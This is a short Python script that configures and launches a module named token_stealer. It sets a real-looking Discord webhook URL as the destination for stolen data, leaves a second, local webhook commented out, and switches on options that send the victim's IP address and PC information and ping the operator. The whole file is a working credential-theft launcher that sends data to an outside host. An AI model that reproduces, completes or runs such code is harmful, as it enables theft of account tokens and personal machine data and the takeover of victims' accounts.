import token_stealer
import os
import requests

token_stealer.WEBHOOK_URL = 'https://discord.com/api/webhooks/1230068262663094353/mAVTXdWToZVyFqk46XyI0BguPyNIYsr-GFYbM34u6pfiry06FQPsAhfg-4MJ97bnUlca'
#token_stealer.WEBHOOK_URL = 'http://192.168.58.130:3000/hooks/662f81991cf87d83aa1106d7/gpPDLm2apBXhoQ4PFBhQgmsi3EhaQYXAZ8dpvi2v7Js4xkaD'
token_stealer.SEND_IP = True
token_stealer.SEND_PC_INFO = True
token_stealer.PING_ME = True
token_stealer.fancy()